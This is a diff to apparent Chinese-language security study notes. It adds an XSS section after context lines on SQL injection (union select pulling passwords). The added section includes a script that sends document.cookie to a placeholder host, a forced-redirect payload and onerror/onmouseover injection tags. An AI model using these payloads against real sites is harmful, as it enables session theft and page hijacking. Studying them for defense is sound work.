@@ -104,6 +104,45 @@ SSI（Server Side Include），当客户端访问这些shtml文件时，服务�
 - `order by [n]`可以使用n（从1开始）来判断数据库一共有几列，大于某个n会报错，就证明有n列
 - `select * from table1 union select 1,2,passwd,4,5 from table2`: 使用union联表可以将另一个表的数据查出来拼接到整体数据中
 
+## 3. js
+
+### 3.1. 攻
+
+#### (1) XSS跨站攻击
+
+XSS攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是JavaScript，但实际上也可以包括Java、 VBScript、ActiveX、 Flash 或者甚至是普通的HTML。攻击成功后，攻击者可能得到包括但不限于更高的权限（如执行一些操作）、私密网页内容、会话和cookie等各种内容。
+
+参考链接: [浅谈XSS攻击的那些事（附常用绕过姿势）](https://zhuanlan.zhihu.com/p/26177815)
+
+**示例1: cookie劫持**
+
+- 通过html注入实现窃取cookie
+- 如果页面直接将输入的值没有做转移展示在页面上，可以触发注入
+- 页面打开后，会立即请求`http://xxx.xxx.xxx?[cookie_of_current]`，将当前页面的cookie发送给了一个网址
+
+```html
+<script>window.location.href="http://xxx.xxx.xxx?"+document.cookie;</script>
+```
+
+**示例2: 页面劫持**
+
+- 通过html注入实现打开此网页自动跳转另一个页面
+
+```html
+<script>window.location.href="http://xxx.xxx.xxx";</script>
+```
+
+**示例3: 通过可植入代码的标签劫持**
+
+```html
+<!-- 图片加载失败做操作 -->
+<img src='w.123' onerror='alert("hey!")'>
+<!-- 鼠标移动做操作 -->
+<a onmousemove="alert('hey')"></a>
+<!-- 鼠标移动到块上做操作 -->
+<div onmouseover="alert('hey')"></div>
+```
+
 # 二、特定软件的攻防
 
 ## 1. apache
